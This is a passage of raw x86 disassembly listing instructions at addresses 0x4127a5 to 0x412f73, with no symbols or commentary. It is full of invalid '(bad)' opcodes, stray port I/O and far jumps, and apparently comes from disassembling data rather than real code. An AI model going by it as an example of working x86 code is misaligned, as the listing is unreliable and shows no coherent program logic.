  4127a5:	out    dx,eax
  4127a6:	push   0x903dc17c
  4127ab:	(bad)  
  4127ac:	enter  0x374a,0x0
  4127b0:	pusha  
  4127b1:	sub    eax,DWORD PTR [ebp-0x54]
  4127b4:	push   ebx
  4127b5:	inc    edx
  4127b6:	outs   dx,BYTE PTR ds:[esi]
  4127b7:	call   0x8e2a04d0
  4127bc:	mov    dh,0xea
  4127be:	jns    0x4127c7
  4127c0:	pushf  
  4127c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127c2:	out    0x74,al
  4127c4:	inc    esp
  4127c5:	test   ebp,edx
  4127c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127c8:	pop    ds
  4127c9:	inc    esi
  4127ca:	cmovb  ebx,DWORD PTR [esi+0x1a4c8b6e]
  4127d1:	cwde   
  4127d2:	push   0x4b5ab050
  4127d7:	inc    ecx
  4127d8:	ss jl  0x412778
  4127db:	add    eax,0xbbaefbdb
  4127e0:	push   es
  4127e1:	mov    ebp,0xbf9de881
  4127e6:	mov    al,ds:0x2d7e4352
  4127eb:	sbb    bl,BYTE PTR [ebx-0x6b733596]
  4127f1:	mov    edx,0xfb7131e4
  4127f6:	ret    
  4127f7:	aam    0xba
  4127f9:	(bad)  
  4127fa:	daa    
  4127fb:	xchg   edi,eax
  4127fc:	sbb    edx,DWORD PTR [esi]
  4127fe:	pop    ebp
  4127ff:	mov    ds,WORD PTR [edi+ebx*1-0x54]
  412803:	std    
  412804:	add    BYTE PTR [eax+0x35e04890],cl
  41280a:	jnp    0x412887
  41280c:	gs lock mov dh,0x35
  412810:	xchg   DWORD PTR [ebx-0x40ee799b],ebx
  412816:	test   al,0x4e
  412818:	bound  edx,QWORD PTR [ebp+0x63]
  41281b:	out    0x62,al
  41281d:	ret    0x2510
  412820:	arpl   bp,bx
  412822:	cli    
  412823:	jmp    0x8800:0x2de6e20f
  41282a:	rcr    DWORD PTR [ebp+0x5d19403f],cl
  412830:	(bad)  
  412831:	jg     0x4128ab
  412833:	arpl   bp,bp
  412835:	loop   0x41280b
  412837:	ds pop eax
  412839:	jno    0x4127e0
  41283b:	or     DWORD PTR [edi+0x15],0xffffff83
  41283f:	push   ecx
  412840:	jle    0x4128ad
  412842:	mov    BYTE PTR [esi-0x4fa11f11],0xca
  412849:	pop    edx
  41284a:	jb     0x412823
  41284c:	clc    
  41284d:	test   BYTE PTR [ebx-0x12],dl
  412850:	(bad)  
  412851:	fdiv   QWORD PTR [ebx+0x7d]
  412854:	fadd   QWORD PTR [ebx+0x2ba9ed91]
  41285a:	aam    0x3
  41285c:	mov    ch,0x6d
  41285e:	pop    esi
  41285f:	cdq    
  412860:	bound  ebp,QWORD PTR [eax+0x69b9dad3]
  412866:	in     eax,dx
  412867:	jmp    FWORD PTR [esi]
  412869:	je     0x4128bb
  41286b:	sub    DWORD PTR [edi+0x34],0x6
  41286f:	repz mov esp,0x31d8d484
  412875:	push   esp
  412876:	inc    edi
  412877:	imul   ecx,DWORD PTR [ebp+0x1d4c0228],0xa52b40b3
  412881:	inc    ebp
  412882:	fisubr WORD PTR [edi+0x79]
  412885:	push   0x8fbe6683
  41288a:	cmp    ebx,eax
  41288c:	test   BYTE PTR [ebp+0x46c3e883],dh
  412892:	push   ecx
  412893:	enter  0x1a00,0xd2
  412897:	dec    esi
  412898:	out    0xb4,eax
  41289a:	sub    cl,dl
  41289c:	jae    0x412916
  41289e:	dec    eax
  41289f:	xor    esi,esp
  4128a1:	in     eax,dx
  4128a2:	mov    eax,ds:0x9e4552c9
  4128a7:	add    eax,0xac60dff4
  4128ac:	jg     0x412912
  4128ae:	daa    
  4128af:	lods   eax,DWORD PTR ds:[esi]
  4128b0:	mov    BYTE PTR [edi],cl
  4128b2:	xor    BYTE PTR [ecx-0x71864a7d],dl
  4128b8:	xor    esp,DWORD PTR ds:0xabaf7b56
  4128be:	stos   BYTE PTR es:[edi],al
  4128bf:	je     0x41285f
  4128c1:	pop    ebp
  4128c2:	fld    TBYTE PTR [ebp+0x5]
  4128c5:	mov    ebx,0x73e69d06
  4128ca:	xor    eax,0x555cd
  4128cf:	fldcw  WORD PTR [ebx]
  4128d1:	mov    eax,ds:0x90a30a9
  4128d6:	cmp    al,0xef
  4128d8:	mov    DWORD PTR [esi],esp
  4128da:	jp     0x4128cf
  4128dc:	pop    es
  4128dd:	(bad)  
  4128df:	nop
  4128e0:	dec    edi
  4128e1:	jnp    0x4128d4
  4128e3:	ret    
  4128e4:	add    BYTE PTR ds:0xade54602,ah
  4128ea:	loope  0x4128ff
  4128ec:	(bad)  
  4128ed:	out    dx,al
  4128ee:	inc    ecx
  4128ef:	and    DWORD PTR [ecx+0x1],ebp
  4128f2:	stos   DWORD PTR es:[edi],eax
  4128f3:	into   
  4128f4:	mov    ebx,0xda21f470
  4128f9:	xlat   BYTE PTR ds:[ebx]
  4128fa:	jecxz  0x412933
  4128fc:	or     al,0x3b
  4128fe:	int    0x2a
  412900:	aaa    
  412901:	mov    cs,WORD PTR [ebp-0x7f]
  412904:	cwde   
  412905:	cmp    ecx,DWORD PTR [edi+0x77d90333]
  41290b:	rol    al,cl
  41290d:	mov    ds:0x19f5e459,eax
  412912:	mov    ss,WORD PTR [ecx-0x47866601]
  412918:	and    ah,BYTE PTR [ecx-0x67]
  41291b:	mov    edi,0xc8982c8
  412920:	jbe    0x412931
  412922:	adc    DWORD PTR [edx-0x4643187e],ebp
  412928:	jbe    0x4128b8
  41292a:	mov    edi,0x7c23a1e5
  41292f:	pop    edx
  412930:	and    edx,DWORD PTR [eax+0x31a7a31c]
  412936:	std    
  412937:	cmp    esi,ebp
  412939:	je     0x4128c3
  41293b:	jmp    0x4129ab
  41293d:	cmovno esp,edi
  412940:	cli    
  412941:	fidiv  WORD PTR [edx]
  412943:	int3   
  412944:	xchg   BYTE PTR [edi+0x18],dl
  412947:	(bad)  
  412949:	mov    dh,0xfa
  41294b:	outs   dx,DWORD PTR ds:[esi]
  41294c:	lds    ebx,FWORD PTR [eax]
  41294e:	sbb    bl,BYTE PTR [eax+0x8]
  412951:	and    ebp,ecx
  412953:	out    0x31,al
  412955:	pusha  
  412956:	cs xchg ebx,eax
  412958:	sub    DWORD PTR [eax-0x2d],0xffffffad
  41295c:	add    eax,0xd9bc8e7
  412961:	xor    eax,0x245f3296
  412966:	aam    0x46
  412968:	xchg   esp,eax
  412969:	sbb    edi,esi
  41296b:	xor    eax,0x4950d631
  412970:	sub    BYTE PTR [esi],cl
  412972:	sub    ch,BYTE PTR [edi-0x5b1c0f82]
  412978:	fxtract 
  41297a:	ds sub ah,bh
  41297d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41297e:	push   0x86b665e0
  412983:	lods   eax,DWORD PTR ds:[esi]
  412984:	sub    eax,0x33aaaef4
  412989:	lds    eax,FWORD PTR [edx]
  41298b:	or     DWORD PTR [ecx-0x65],esp
  41298e:	out    0x68,eax
  412990:	push   0xffffff8f
  412992:	push   eax
  412993:	popf   
  412994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412995:	or     al,0xba
  412997:	shl    cl,cl
  412999:	mov    al,0x34
  41299b:	jbe    0x412a04
  41299d:	add    eax,0x3ac82996
  4129a2:	sbb    eax,0x334512a4
  4129a7:	shl    DWORD PTR [edx+0x70],1
  4129aa:	sub    edi,ebx
  4129ac:	hlt    
  4129ad:	shl    bl,cl
  4129af:	xchg   ecx,eax
  4129b0:	jae    0x4129ae
  4129b2:	pusha  
  4129b3:	cmp    al,0xaa
  4129b5:	mov    edx,DWORD PTR [ebp+0x7b1e60c7]
  4129bb:	jp     0x4129a9
  4129bd:	xchg   ebx,eax
  4129be:	mov    ebp,0x492c13f6
  4129c3:	jo     0x412945
  4129c5:	enter  0x4cec,0xd9
  4129c9:	lods   eax,DWORD PTR ds:[esi]
  4129ca:	and    edx,DWORD PTR [ecx+0x1a0a5793]
  4129d0:	arpl   WORD PTR [eax],bx
  4129d2:	fild   DWORD PTR [ecx+0x58]
  4129d5:	dec    eax
  4129d6:	bound  esp,QWORD PTR [ecx+0x13]
  4129d9:	push   ds
  4129da:	xchg   edi,eax
  4129db:	or     ebp,edx
  4129dd:	das    
  4129de:	inc    ebp
  4129df:	jo     0x4129c7
  4129e1:	or     edx,esi
  4129e3:	push   cs
  4129e4:	xchg   esp,eax
  4129e5:	cli    
  4129e6:	pop    edx
  4129e7:	cmp    BYTE PTR [ebp+0x18],cl
  4129ea:	clc    
  4129eb:	or     BYTE PTR [ebp+0x21],bl
  4129ee:	xchg   ecx,eax
  4129ef:	iret   
  4129f0:	jo     0x412a43
  4129f2:	jbe    0x412994
  4129f4:	dec    ecx
  4129f5:	pop    es
  4129f6:	mul    BYTE PTR [ebp-0x532a4873]
  4129fc:	je     0x412a27
  4129fe:	test   eax,0xf1bd5550
  412a03:	inc    ecx
  412a04:	cmp    ebp,DWORD PTR [edi+0x5d]
  412a07:	aam    0x63
  412a09:	mov    al,BYTE PTR [edi+0x5692b646]
  412a0f:	or     cl,BYTE PTR [edi]
  412a11:	aam    0x47
  412a13:	add    al,0xf2
  412a15:	aam    0x6a
  412a17:	pop    edx
  412a18:	sahf   
  412a19:	pop    ebx
  412a1a:	push   ss
  412a1b:	mov    dh,0xdd
  412a1d:	mov    ecx,0xc9186c8e
  412a22:	mov    dl,0x84
  412a24:	dec    esp
  412a25:	push   ss
  412a26:	(bad)  [edx-0x70]
  412a29:	test   al,0xcb
  412a2b:	adc    ebx,DWORD PTR [esi+eiz*8-0x3371e19]
  412a32:	dec    edx
  412a33:	test   DWORD PTR [edi],ebx
  412a35:	sahf   
  412a36:	mov    dl,0x5b
  412a38:	and    BYTE PTR [ecx+0x429b33d1],bh
  412a3e:	adc    DWORD PTR cs:[esi],esi
  412a41:	shl    dh,cl
  412a43:	sar    dl,1
  412a45:	mov    esi,0x4932407e
  412a4a:	xlat   BYTE PTR ds:[ebx]
  412a4b:	jno    0x412a71
  412a4d:	add    cl,BYTE PTR [edi+0x49]
  412a50:	les    edx,FWORD PTR [esp+eiz*4]
  412a53:	ja     0x412a74
  412a55:	mov    al,ds:0x7a38de56
  412a5a:	or     ah,bh
  412a5c:	push   es
  412a5d:	jne    0x412a19
  412a5f:	push   ds
  412a60:	fbld   TBYTE PTR [edx+esi*8]
  412a63:	jno    0x412a83
  412a65:	mov    esp,0x57c3be6b
  412a6a:	sbb    BYTE PTR [esi-0xd5c7ef6],bh
  412a70:	fiadd  WORD PTR [ebx+0x4d]
  412a73:	lds    edx,FWORD PTR [ebp-0x5d546e8b]
  412a79:	and    eax,0xefa9335
  412a7e:	jae    0x412ab3
  412a80:	or     al,0x7d
  412a82:	jecxz  0x412af2
  412a84:	mov    edi,0x422884a2
  412a89:	int    0xa9
  412a8b:	enter  0xfc20,0x88
  412a8f:	imul   edx,DWORD PTR [esi],0xad3c88ba
  412a95:	stos   DWORD PTR es:[edi],eax
  412a96:	out    0x8f,al
  412a98:	call   0xe6ac:0x6bc8e279
  412a9f:	push   ds
  412aa0:	and    BYTE PTR [edx+ecx*2],ch
  412aa3:	jmp    0x412b23
  412aa5:	mov    al,BYTE PTR [ecx+0x1c2e0f1f]
  412aab:	xchg   edi,eax
  412aac:	fwait
  412aad:	call   0xcf3e:0xfa4ddb75
  412ab4:	jmp    0x1627b090
  412ab9:	jmp    DWORD PTR [ebx+esi*1+0x5c56e607]
  412ac0:	mov    ch,0x17
  412ac2:	cmp    eax,edi
  412ac4:	sti    
  412ac5:	add    BYTE PTR [ebx+0x185e686e],bl
  412acb:	xor    eax,0x906fbb65
  412ad0:	ror    DWORD PTR [edi],cl
  412ad2:	nop
  412ad3:	and    dl,BYTE PTR [edi]
  412ad5:	inc    esi
  412ad6:	neg    DWORD PTR [edx+0x7c]
  412ad9:	fiadd  WORD PTR [eax]
  412adb:	dec    ebp
  412adc:	xor    eax,0x5113bb2f
  412ae1:	push   es
  412ae2:	mov    ah,0x7c
  412ae4:	(bad)  
  412ae5:	cmp    eax,DWORD PTR [esi+0x3b485137]
  412aeb:	add    eax,0xf176ee3
  412af0:	xchg   edx,eax
  412af1:	gs loop 0x412aee
  412af4:	or     eax,0xa3df3630
  412af9:	cmp    DWORD PTR [edi-0x10770274],0xffffffdf
  412b00:	pop    eax
  412b01:	enter  0x27ab,0x1d
  412b05:	inc    esp
  412b06:	mov    dh,BYTE PTR [edx]
  412b08:	fld    DWORD PTR [esi+eax*1-0x3abb9910]
  412b0f:	cs mov ah,0xd9
  412b12:	ds inc eax
  412b14:	pop    esi
  412b15:	into   
  412b16:	outs   dx,BYTE PTR ds:[esi]
  412b17:	pop    es
  412b18:	adc    bl,bl
  412b1a:	out    0x4d,al
  412b1c:	jo     0x412aa9
  412b1e:	aaa    
  412b1f:	mov    edx,0xf827c9ad
  412b24:	inc    eax
  412b25:	daa    
  412b26:	push   esi
  412b27:	mov    esp,0x21d09de8
  412b2c:	xor    edx,ebp
  412b2e:	mov    ah,0x22
  412b30:	mov    BYTE PTR [ecx+edx*2],cl
  412b33:	mov    bh,0x11
  412b35:	add    DWORD PTR [ecx+0x1c61c05b],ebx
  412b3b:	into   
  412b3c:	dec    ebp
  412b3d:	jg     0x412b92
  412b3f:	cmc    
  412b40:	loope  0x412b40
  412b42:	jg     0x412b04
  412b44:	out    dx,al
  412b45:	mov    ds:0x1c566d39,eax
  412b4a:	ds mov ecx,0x2103882
  412b50:	gs sti 
  412b52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b53:	ins    DWORD PTR es:[edi],dx
  412b54:	jne    0x412aff
  412b56:	xor    eax,DWORD PTR [edi+edx*2]
  412b59:	sti    
  412b5a:	cmc    
  412b5b:	adc    edi,eax
  412b5d:	mov    al,0x2b
  412b5f:	inc    esp
  412b60:	cmp    esp,DWORD PTR [eax-0x29988d9e]
  412b66:	push   ebx
  412b67:	cld    
  412b68:	aam    0x2a
  412b6a:	push   edx
  412b6b:	fcom   DWORD PTR [edi]
  412b6d:	pop    esp
  412b6e:	les    edi,FWORD PTR [esi+0x3c]
  412b71:	sbb    bh,dh
  412b73:	in     al,0x73
  412b75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b76:	push   edx
  412b77:	fmul   st,st(0)
  412b79:	pop    ebx
  412b7a:	mov    dh,0xf4
  412b7c:	pop    ebp
  412b7d:	add    eax,0xe720ad56
  412b82:	adc    eax,esp
  412b84:	ja     0x412b1d
  412b86:	dec    edx
  412b87:	stos   DWORD PTR es:[edi],eax
  412b88:	out    0x8f,al
  412b8a:	fwait
  412b8b:	xchg   ecx,eax
  412b8c:	push   edi
  412b8d:	or     eax,DWORD PTR [ebp-0x56]
  412b90:	xchg   edx,eax
  412b91:	cli    
  412b92:	jmp    0x412bbe
  412b94:	jo     0x412be4
  412b96:	jb     0x412b8b
  412b98:	add    BYTE PTR [edx+eiz*1],0x96
  412b9c:	dec    esi
  412b9d:	jge    0x412beb
  412b9f:	push   eax
  412ba0:	xchg   ebx,eax
  412ba1:	sbb    eax,0x82fe8978
  412ba6:	xor    BYTE PTR [eax],dl
  412ba8:	dec    ebx
  412ba9:	lahf   
  412baa:	add    DWORD PTR [edi+0x5b766a11],edx
  412bb0:	xchg   esp,eax
  412bb1:	data16 mov cl,0x84
  412bb4:	(bad)  
  412bb5:	(bad)  [edx-0x190269c3]
  412bbb:	pop    ds
  412bbc:	iret   
  412bbd:	cld    
  412bbe:	in     al,0x63
  412bc0:	cmc    
  412bc1:	xor    BYTE PTR [edx+0x468c046b],0x38
  412bc8:	dec    edx
  412bc9:	sub    DWORD PTR [eax],ebx
  412bcb:	idiv   DWORD PTR [ebx+ecx*8-0x98b1ce1]
  412bd2:	outs   dx,DWORD PTR ds:[esi]
  412bd3:	inc    ebp
  412bd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bd5:	(bad)
  412bd8:	push   esp
  412bd9:	dec    edi
  412bda:	popf   
  412bdb:	stos   BYTE PTR es:[edi],al
  412bdc:	mov    ch,0x4d
  412bde:	sub    edx,0xfffffffe
  412be1:	scas   al,BYTE PTR es:[edi]
  412be2:	add    cl,bl
  412be4:	aam    0x3a
  412be6:	jne    0x412bf6
  412be8:	sahf   
  412be9:	cmp    eax,0x6e04ea4a
  412bee:	popa   
  412bef:	xor    BYTE PTR [esi],al
  412bf1:	or     DWORD PTR [ebx],eax
  412bf3:	xlat   BYTE PTR ds:[ebx]
  412bf4:	xchg   DWORD PTR [ecx+0x3895af98],ebx
  412bfa:	jge    0x412c47
  412bfc:	rcl    DWORD PTR [eax],cl
  412bfe:	sub    DWORD PTR [esi],esi
  412c00:	mov    ds:0xb6bfa49f,al
  412c05:	jno    0x412c68
  412c07:	(bad)  
  412c08:	div    eax
  412c0a:	dec    eax
  412c0b:	inc    ebx
  412c0c:	mov    edi,0xfacff94f
  412c11:	pop    ebp
  412c12:	add    al,al
  412c14:	xchg   ecx,eax
  412c15:	outs   dx,BYTE PTR ds:[esi]
  412c16:	lock mov dl,0xe5
  412c19:	gs nop
  412c1b:	add    DWORD PTR [eax+0x2d4e1839],ebx
  412c21:	out    dx,al
  412c22:	imul   ecx,DWORD PTR ds:0x9fe093a7,0x2a35fd35
  412c2c:	call   0xc6b7:0xcbbd23ce
  412c33:	fcomp  QWORD PTR [ecx-0x3e]
  412c36:	inc    esi
  412c37:	imul   ebx,DWORD PTR [ebp+0x58],0x2a
  412c3b:	in     eax,dx
  412c3c:	(bad)  [esi+0x9716cf9]
  412c42:	test   BYTE PTR ss:[ebp-0x7b],cl
  412c46:	jp     0x412c39
  412c48:	fwait
  412c49:	jmp    0xc5cb:0x52e7ab50
  412c50:	fmul   st,st(0)
  412c52:	xchg   edi,eax
  412c53:	int3   
  412c54:	repz lahf 
  412c56:	cmc    
  412c57:	dec    ebp
  412c58:	mov    ds:0x2b8a4bc8,eax
  412c5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c5e:	cmc    
  412c5f:	and    BYTE PTR [ecx+eax*2],dl
  412c62:	push   edx
  412c63:	jb     0x412c58
  412c65:	pop    ss
  412c66:	inc    ebp
  412c67:	push   esp
  412c68:	jmp    0xa37:0xe737224b
  412c6f:	imul   ebp,DWORD PTR [edx+0x6dc5d61e],0x1b
  412c76:	fisub  DWORD PTR [esi+0x5b]
  412c79:	mov    ds:0x13b3bf42,eax
  412c7e:	dec    edi
  412c80:	sbb    eax,ecx
  412c82:	jno    0x412cc4
  412c84:	push   eax
  412c85:	addr16 inc edx
  412c87:	jne    0x412cfb
  412c89:	pop    ds
  412c8a:	(bad)  
  412c8b:	mov    ebp,0x339fe7b2
  412c90:	xchg   esp,eax
  412c91:	or     BYTE PTR [ebx],0x59
  412c94:	hlt    
  412c95:	ins    DWORD PTR es:[edi],dx
  412c96:	call   FWORD PTR [ebp+0x5df58b68]
  412c9c:	fild   DWORD PTR [ebx-0x12335d]
  412ca2:	jmp    0xbbf8751e
  412ca7:	mov    ebp,0x9313becd
  412cac:	mov    ds:0xe1fc47c7,eax
  412cb1:	mov    bl,0x6e
  412cb3:	dec    esp
  412cb4:	outs   dx,DWORD PTR ds:[esi]
  412cb5:	sar    DWORD PTR [ebx+0x67],0x6f
  412cb9:	stos   BYTE PTR es:[edi],al
  412cba:	pop    es
  412cbb:	xchg   edx,eax
  412cbc:	add    dl,BYTE PTR [ecx]
  412cbe:	push   ebp
  412cbf:	dec    esi
  412cc0:	or     eax,0x7993df43
  412cc5:	test   DWORD PTR [ecx-0x60637229],0xf15fca83
  412ccf:	(bad)  
  412cd0:	fadd   DWORD PTR [esi+0x68]
  412cd3:	or     DWORD PTR [edi-0x7a],0xc439d000
  412cda:	leave  
  412cdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cdc:	iret   
  412cdd:	imul   edi,DWORD PTR [edx+0x5f57b829],0x319006b6
  412ce7:	mov    ecx,0x41ca7910
  412cec:	cmp    al,0x99
  412cee:	(bad)  
  412cef:	fwait
  412cf0:	ret    0x4c06
  412cf3:	ds icebp 
  412cf5:	jo     0x412ccf
  412cf7:	jns    0x412d44
  412cf9:	inc    ebp
  412cfa:	push   esi
  412cfb:	(bad)  
  412cfc:	pop    edi
  412cfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cfe:	inc    esp
  412cff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d00:	lock jb 0x412d25
  412d03:	fiadd  WORD PTR [ecx-0x80]
  412d06:	dec    al
  412d08:	mov    esp,0xcde608c9
  412d0d:	repnz inc esi
  412d0f:	sub    BYTE PTR [esi],al
  412d11:	call   0xf5c6:0xab68928
  412d18:	std    
  412d19:	or     al,0x21
  412d1b:	pop    ds
  412d1c:	and    BYTE PTR [edi],dl
  412d1e:	xor    DWORD PTR [esi],esi
  412d20:	pop    edi
  412d21:	cli    
  412d22:	idiv   edx
  412d24:	call   0x159e4afc
  412d29:	bound  ecx,QWORD PTR [edx+0x28]
  412d2c:	jns    0x412d5e
  412d2e:	add    ecx,DWORD PTR [ecx]
  412d30:	sar    ch,0x5a
  412d33:	and    ah,BYTE PTR [edx+0x10]
  412d36:	pop    esp
  412d37:	ret    0x41de
  412d3a:	in     eax,0xb7
  412d3c:	shl    al,cl
  412d3e:	or     cl,BYTE PTR [esi]
  412d40:	les    edi,FWORD PTR [ecx]
  412d42:	out    dx,al
  412d43:	pusha  
  412d44:	pop    es
  412d45:	and    eax,0x45711a15
  412d4a:	push   0xffffffd2
  412d4c:	dec    esp
  412d4d:	sbb    eax,0xe662d26b
  412d52:	adc    eax,0xffffffde
  412d55:	rol    ebx,0x76
  412d58:	stos   DWORD PTR es:[di],eax
  412d5a:	mov    dl,BYTE PTR [ebx-0x60758b84]
  412d60:	js     0x412dd9
  412d62:	jl     0x412cf6
  412d64:	inc    ecx
  412d65:	xor    esp,DWORD PTR [esi]
  412d67:	adc    DWORD PTR [ecx-0x73ed5a38],edx
  412d6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d6e:	mov    edx,0xc7cc92c
  412d73:	push   es
  412d74:	retf   0xbbbe
  412d77:	or     BYTE PTR [edi],0xff
  412d7a:	sub    BYTE PTR [edi],al
  412d7c:	adc    ebx,DWORD PTR [esi-0x62424361]
  412d82:	mov    edi,0xbdc2c0b0
  412d87:	es add eax,0xcaeefc7e
  412d8d:	adc    DWORD PTR [eax+esi*4+0x3a],0x6e6a7578
  412d95:	inc    bx
  412d97:	in     eax,0x54
  412d99:	adc    al,0x9d
  412d9b:	or     DWORD PTR [edx],ebp
  412d9d:	outs   dx,DWORD PTR ds:[esi]
  412d9e:	xlat   BYTE PTR ds:[ebx]
  412d9f:	cmp    edx,DWORD PTR [edx+ebp*8]
  412da2:	lahf   
  412da3:	gs mov ah,0x9e
  412da6:	xchg   esi,eax
  412da7:	(bad)  
  412da8:	mov    esp,0x9a24ca5b
  412dad:	inc    ecx
  412dae:	leave  
  412daf:	ficomp DWORD PTR [ebx+0x53]
  412db2:	inc    edi
  412db3:	int3   
  412db4:	iret   
  412db5:	outs   dx,BYTE PTR ds:[esi]
  412db6:	test   al,0x8d
  412db8:	(bad)  
  412db9:	and    al,BYTE PTR [edi-0x27]
  412dbc:	test   ebp,0x9269169d
  412dc2:	inc    ecx
  412dc3:	add    BYTE PTR ds:0xf4f10c3,ch
  412dc9:	mov    ds:0x2bb2653d,al
  412dce:	jbe    0x412e21
  412dd0:	jo     0x412e2b
  412dd2:	pop    esi
  412dd3:	inc    esp
  412dd4:	lahf   
  412dd5:	pop    edx
  412dd6:	(bad)  [edx-0x679002ae]
  412ddc:	shl    BYTE PTR [ecx-0x53e327fd],cl
  412de2:	push   ebp
  412de3:	dec    edx
  412de4:	mov    ch,0x73
  412de6:	rcr    ch,0x76
  412de9:	xor    DWORD PTR [edi-0xf],esi
  412dec:	jecxz  0x412e32
  412dee:	lahf   
  412def:	cli    
  412df0:	push   0x70
  412df2:	xchg   edi,eax
  412df3:	push   cs
  412df4:	add    edi,esi
  412df6:	lock add BYTE PTR [ecx-0x23293006],al
  412dfd:	leave  
  412dfe:	xchg   ebp,eax
  412dff:	and    esp,DWORD PTR [ebx-0x54]
  412e02:	pop    ebp
  412e03:	(bad)  
  412e04:	push   ebx
  412e05:	cmp    eax,0x3f89ff99
  412e0a:	mov    ch,BYTE PTR [edi+0x3c]
  412e0d:	mov    dl,0xb4
  412e0f:	adc    DWORD PTR [edi+0x6d],0x93b91a99
  412e16:	iret   
  412e17:	push   ecx
  412e18:	pop    esp
  412e19:	jge    0x412de9
  412e1b:	mov    ebx,DWORD PTR [edi+0x2b0c0b47]
  412e21:	daa    
  412e22:	or     eax,0x190304ec
  412e27:	ret    0x1221
  412e2a:	mov    edx,0x6032f14
  412e2f:	int3   
  412e30:	and    eax,DWORD PTR [ecx]
  412e32:	fs pop ebp
  412e34:	cmp    edi,eax
  412e36:	(bad)  
  412e37:	std    
  412e38:	jo     0x412e5f
  412e3a:	sbb    eax,0xed98b08f
  412e3f:	loope  0x412e62
  412e41:	aaa    
  412e42:	mov    ds:0x17525b5,eax
  412e47:	inc    esp
  412e48:	add    bh,0x7f
  412e4b:	das    
  412e4c:	mov    cl,0xc5
  412e4e:	pop    ebx
  412e4f:	lahf   
  412e50:	cmp    BYTE PTR [eax-0x4],bl
  412e53:	jecxz  0x412dfa
  412e55:	mov    eax,0x2643b1d7
  412e5a:	loopne 0x412eda
  412e5c:	adc    eax,DWORD PTR [edi]
  412e5e:	call   0x3e5220e7
  412e63:	enter  0x5124,0xa4
  412e67:	loope  0x412e42
  412e69:	xor    esp,DWORD PTR [ecx]
  412e6b:	mov    al,0x60
  412e6d:	leave  
  412e6e:	xchg   ecx,eax
  412e6f:	inc    esp
  412e70:	push   cs
  412e71:	add    al,BYTE PTR [edx-0x2e]
  412e74:	sahf   
  412e75:	pop    ss
  412e76:	loop   0x412eaf
  412e78:	sti    
  412e79:	xchg   BYTE PTR [ebx+eiz*1-0x9],cl
  412e7d:	mov    BYTE PTR [ecx],ch
  412e7f:	or     al,BYTE PTR [eax-0x2b]
  412e82:	cmp    ebp,esi
  412e84:	mov    ah,0xe9
  412e86:	xchg   BYTE PTR [esi-0x3b],al
  412e89:	retf   0x373f
  412e8c:	cmp    dh,BYTE PTR [edx]
  412e8e:	(bad)  
  412e90:	sbb    eax,0x984a657
  412e95:	push   esi
  412e96:	aad    0xee
  412e98:	dec    ebp
  412e99:	sbb    dl,BYTE PTR ds:[ecx-0x54]
  412e9d:	pop    ecx
  412e9e:	mov    dh,BYTE PTR [esi+0x582a4dbe]
  412ea4:	ret    0xa9a8
  412ea7:	loope  0x412e4e
  412ea9:	pop    es
  412eaa:	or     ebx,0x9e62409f
  412eb0:	(bad)  
  412eb3:	jmp    0xe03d18af
  412eb8:	ins    DWORD PTR es:[edi],dx
  412eb9:	in     al,dx
  412eba:	mov    ds:0x4138e99d,al
  412ebf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ec0:	cmp    eax,0x6c25ca21
  412ec5:	scas   al,BYTE PTR es:[edi]
  412ec6:	int3   
  412ec7:	(bad)  
  412ec8:	cmp    BYTE PTR [edx+0x53d61298],cl
  412ece:	jge    0x412f4e
  412ed0:	adc    al,BYTE PTR [eax+0x4073e0e]
  412ed6:	shl    DWORD PTR [ebx-0x48bb22b8],1
  412edc:	scas   al,BYTE PTR es:[edi]
  412edd:	imul   edx,DWORD PTR [esi-0x2f1950a8],0x21
  412ee4:	adc    DWORD PTR [esi+0x3ea204f5],esi
  412eea:	jmp    0x412e76
  412eec:	ins    BYTE PTR es:[edi],dx
  412eed:	add    dh,BYTE PTR [edi+0x7c]
  412ef0:	xor    cl,bh
  412ef2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ef3:	stos   BYTE PTR es:[edi],al
  412ef4:	test   eax,0x79f99fb9
  412ef9:	out    dx,eax
  412efa:	sub    al,0x88
  412efc:	sbb    eax,0xac8c9a47
  412f01:	ror    BYTE PTR [edx-0x3e],1
  412f04:	mov    dh,0xab
  412f06:	sub    DWORD PTR [edi],eax
  412f08:	in     al,0x13
  412f0a:	cmp    ah,BYTE PTR [edi+0x33]
  412f0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f0e:	rol    DWORD PTR [ecx+0x410839c2],1
  412f14:	mov    esi,0xce8ec00b
  412f19:	xchg   ecx,eax
  412f1a:	mov    bh,0x2e
  412f1c:	mov    eax,0x8f40673a
  412f21:	ins    DWORD PTR es:[edi],dx
  412f22:	fwait
  412f23:	les    edx,FWORD PTR [ebx-0x6a]
  412f26:	pop    edi
  412f27:	rol    edi,0xea
  412f2a:	jbe    0x412f27
  412f2c:	es cli 
  412f2e:	adc    eax,0xb32e056e
  412f33:	shl    DWORD PTR [eax-0x1],1
  412f36:	out    dx,al
  412f37:	push   es
  412f38:	imul   edi,DWORD PTR [ebp+0x17],0xffffffba
  412f3c:	cs call 0x69c0:0x7f2fad23
  412f44:	loope  0x412edc
  412f46:	sbb    eax,0xea896d2c
  412f4b:	add    edi,DWORD PTR [edx-0x101b6352]
  412f51:	das    
  412f52:	scas   eax,DWORD PTR es:[edi]
  412f53:	jbe    0x412f69
  412f55:	sbb    DWORD PTR [edi],esi
  412f57:	jge    0x412f51
  412f59:	jmp    0x4ba9:0xb48c6e3f
  412f60:	dec    edi
  412f61:	mov    es,WORD PTR [edi+0x3c0adbe]
  412f67:	loope  0x412fc0
  412f69:	hlt    
  412f6a:	mov    al,0xc7
  412f6c:	shr    DWORD PTR [ecx+ebx*8],0x39
  412f70:	sbb    al,0x34
  412f72:	inc    ebp
  412f73:	in     eax,dx
